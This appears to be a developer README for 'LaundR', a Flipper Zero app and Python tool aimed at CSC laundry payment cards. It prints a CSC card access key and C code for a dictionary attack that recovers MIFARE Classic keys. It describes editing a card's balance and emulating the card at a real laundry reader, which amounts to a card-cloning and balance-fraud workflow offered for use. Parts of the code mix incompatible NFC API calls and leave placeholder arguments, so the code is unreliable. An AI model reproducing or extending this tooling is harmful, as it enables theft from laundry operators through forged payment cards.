# LaundR Flipper App - Card Reading Support

## Can it work with 2/3 keys?

**Yes!** The Flipper Zero's NFC system can read MIFARE Classic cards even if you don't have all the keys.

### Key Requirements

For most laundry cards:
- **Minimum:** Key A for sectors 0-3 (where critical data is stored)
- **Preferred:** Key A for all sectors + Key B for sectors you want to write to
- **Ideal:** Both Key A and Key B for all sectors

### Typical CSC Laundry Card

```
Sector 0: Key A = EE B7 06 FC 71 4F (CSC default)
Sector 1: Key A = EE B7 06 FC 71 4F
Sector 2: Key A = EE B7 06 FC 71 4F
Sector 3: Key A = EE B7 06 FC 71 4F
Sectors 4-15: Key A/B = FF FF FF FF FF FF (factory default)
```

**With just these 2 keys, you can read the entire card!**

---

## Using Files from Flipper's Built-in NFC App

**Yes!** LaundR is 100% compatible with Flipper Zero's `.nfc` file format.

### Workflow

**1. Read card with Flipper's NFC app:**
```
Flipper → NFC → Read Card
→ Reads with dictionary attack
→ Finds keys automatically
→ Save as "my_card.nfc"
```

**2. Option A: Use file in LaundR Python app**
```
# Copy .nfc file from Flipper SD card to PC
# Then analyze in LaundR
python3 laundr.py /path/to/my_card.nfc
```

**3. Option B: Use file in LaundR Flipper app**
```
# LaundR app loads the same file
Flipper → Apps → NFC → LaundR
→ Load Card → Select "my_card.nfc"
→ Start Emulation
```

---

## Can LaundR Read Cards Directly?

**Yes! We can add direct card reading to the Flipper app.**

### Two Approaches

**Approach 1: Use Flipper's Built-in NFC First (Current Method)**

```
Step 1: Read card with Flipper NFC app
  → NFC → Read Card → Save as "card.nfc"

Step 2: Load in LaundR app
  → Apps → NFC → LaundR → Load Card → "card.nfc"

Step 3: Test transaction
  → Start Emulation → Hold near reader
```

**Pros:**
- ✅ Works now (no code changes needed)
- ✅ Uses Flipper's proven dictionary attack
- ✅ Saves card for future use
- ✅ Can edit balance in LaundR desktop app

**Cons:**
- ⚠️ Requires two-step process
- ⚠️ Must navigate to two different apps

---

**Approach 2: Direct Reading in LaundR App (Enhanced Version)**

Add NFC reading capability directly to LaundR:

```c
#include <nfc/nfc_device.h>
#include <nfc/helpers/nfc_dict.h>

// In LaundR app menu:
// 1. Read Card (new option)
// 2. Load Card (from file)
// 3. Start Emulation

void laundr_read_card(LaundRApp* app) {
    // Start NFC worker
    NfcWorker* worker = nfc_worker_alloc();

    // Load dictionary
    NfcDict* dict = nfc_dict_alloc(NFC_DICT_SYSTEM);

    // Detect card
    nfc_worker_start(worker, NfcWorkerStateDetect, ...);

    // Read with dictionary attack
    nfc_worker_start(worker, NfcWorkerStateMfClassicDictAttack, ...);

    // Get result
    MfClassicData* card_data = nfc_device_get_data(app->nfc_dev, NfcProtocolMfClassic);

    // Store in app
    app->card_loaded = true;
    app->balance = extract_balance(card_data);

    nfc_dict_free(dict);
    nfc_worker_free(worker);
}
```

**Pros:**
- ✅ Single app workflow
- ✅ Read and test in one place
- ✅ More convenient

**Cons:**
- ⚠️ Requires more code
- ⚠️ Dictionary attack takes 30-60 seconds
- ⚠️ Must implement key finding logic

---

## Implementation: Direct Card Reading

### Updated Menu Structure

```
LaundR Main Menu:
├── Read Card from NFC      ← NEW
├── Load Card from File
├── Toggle Mode (Test/Normal)
├── Start Emulation
├── View Log
└── Exit
```

### Code Implementation

```c
// Add to application.fam
requires=["gui", "nfc"],  // Add NFC requirement

// Add to laundr_simple.c

#include <nfc/nfc.h>
#include <nfc/nfc_device.h>
#include <nfc/protocols/mf_classic/mf_classic.h>
#include <nfc/helpers/nfc_dict.h>

typedef struct {
    // ... existing fields ...

    // NFC components
    Nfc* nfc;
    NfcDevice* nfc_dev;
    NfcListener* nfc_listener;

    // Card reading state
    bool reading_card;
    uint8_t keys_found;
    uint8_t total_sectors;
} LaundRApp;

// Card reading function
static void laundr_read_card_callback(NfcEvent event, void* context) {
    LaundRApp* app = (LaundRApp*)context;

    switch(event) {
    case NfcEventTypeCardDetected:
        FURI_LOG_I(TAG, "Card detected");
        app->reading_card = true;
        break;

    case NfcEventTypeCardLost:
        FURI_LOG_I(TAG, "Card lost");
        app->reading_card = false;
        break;

    default:
        break;
    }
}

static void laundr_read_card(LaundRApp* app) {
    // Initialize NFC
    app->nfc = nfc_alloc();
    app->nfc_dev = nfc_device_alloc();

    // Load system dictionary
    MfClassicDict* dict = mf_classic_dict_alloc(MfClassicDictTypeFlipper);

    // Start detection
    nfc_start(app->nfc, NfcModeListener, laundr_read_card_callback, app);

    FURI_LOG_I(TAG, "Hold card near Flipper...");

    // Wait for card
    while(!app->reading_card && app->state == LaundRStateReading) {
        furi_delay_ms(100);
    }

    if(app->reading_card) {
        // Perform dictionary attack
        MfClassicData* card_data = nfc_device_get_data(app->nfc_dev);

        for(uint8_t sector = 0; sector < 16; sector++) {
            // Try keys from dictionary
            mf_classic_dict_rewind(dict);

            while(mf_classic_dict_get_next_key(dict, &key)) {
                if(mf_classic_authenticate(card_data, sector, &key, MfClassicKeyTypeA)) {
                    // Key found! Read sector
                    for(uint8_t block = 0; block < 4; block++) {
                        mf_classic_read_block(card_data, sector * 4 + block, ...);
                    }
                    app->keys_found++;
                    break;
                }
            }
        }

        // Extract balance
        app->balance = extract_balance_from_card(card_data);
        app->card_loaded = true;

        FURI_LOG_I(TAG, "Card read: %d/16 sectors, Balance: $%.2f", app->keys_found, app->balance / 100.0);
    }

    // Cleanup
    mf_classic_dict_free(dict);
    nfc_stop(app->nfc);
    nfc_device_free(app->nfc_dev);
    nfc_free(app->nfc);
}
```

---

## Practical Considerations

### Which Approach to Use?

**For most users:**
- Use Flipper's built-in NFC app to read and save the card first
- Then load the file in LaundR

**Why?**
- Flipper's NFC app is battle-tested and reliable
- Reading takes 30-60 seconds anyway
- You get a saved file you can reuse
- LaundR desktop app can edit the file

**For advanced users:**
- Direct reading in LaundR app is convenient
- Useful if you're testing multiple cards quickly
- Good for live testing without saving files

---

## Working with Partial Keys

### Scenario 1: Only Key A for Sector 0

```
Keys found: 1/32 (just sector 0 Key A)

Can read:
✓ Block 0 (UID)
✓ Block 1 (System data)
✓ Block 2 (Transaction data)
✗ Block 3 (Sector trailer - hidden)

Result: Enough for basic analysis
Can see: Balance, provider, transaction history
Cannot: Write to card
```

### Scenario 2: Key A for All Sectors

```
Keys found: 16/32 (Key A for all sectors)

Can read:
✓ All data blocks
✗ Sector trailers (Key B still hidden)

Result: Full read access
Can see: Everything
Cannot: Write to card (need Key B)
```

### Scenario 3: Both Keys for All Sectors

```
Keys found: 32/32 (Key A and B for all sectors)

Can read:
✓ All blocks
✓ All sector trailers

Result: Full access
Can see: Everything including keys
Can: Write to card with LaundR (if magic card)
```

---

## Example: Reading a CSC Card

**Step-by-step with Flipper NFC app:**

```
1. Flipper → NFC → Read Card
   → "Detecting card..."
   → "MIFARE Classic 1K detected"
   → "Reading with dictionary..."
   → [30 seconds pass]
   → "28/32 keys found"
   → "16/16 sectors read"
   → Save → "csc_card_2025.nfc"

2. Result:
   Block 0: 2B B9 91 B5 ...  (UID)
   Block 1: ... 62 EE 11 01  (CSC signature)
   Block 2: 01 01 ...        (Transaction data)
   Block 4: 84 03 02 00 ...  (Balance: $9.00)

3. Keys found:
   Sector 0 Key A: EE B7 06 FC 71 4F (CSC key)
   Sectors 4-15 Key A: FF FF FF FF FF FF (default)
   Sectors 4-15 Key B: FF FF FF FF FF FF (default)
   Total: 28/32 keys (missing: Key B for sectors 0-3)

4. Can read: ✓ All balance and transaction data
   Can write: ✗ Not to sectors 0-3 (need Key B)
```

**Using in LaundR:**

```
Option A: Desktop app
  cp /flipper/sd/nfc/csc_card_2025.nfc ~/Documents/
  python3 laundr.py csc_card_2025.nfc

Option B: Flipper app
  Flipper → Apps → NFC → LaundR
  → Load Card → csc_card_2025.nfc
  → Start Emulation
```

---

## Summary

| Question | Answer |
|----------|--------|
| Can it work with 2/3 keys? | ✅ Yes, Key A for sectors 0-3 is usually enough |
| Can we use Flipper NFC app files? | ✅ Yes, 100% compatible .nfc format |
| Can LaundR read cards directly? | ✅ Can be added with NFC API |
| Recommended approach? | Use Flipper NFC app first, then load file |
| Minimum keys needed? | Key A for sector 0 (basic analysis) |
| Keys for full read access? | Key A for all sectors (16 keys) |
| Keys for write access? | Key B for sectors (need magic card or Proxmark3) |

**Bottom line:** Start with Flipper's built-in NFC app to read and save your card. The LaundR app can then load that file for emulation and testing. For convenience, we can add direct reading to LaundR, but the two-step process works perfectly fine.
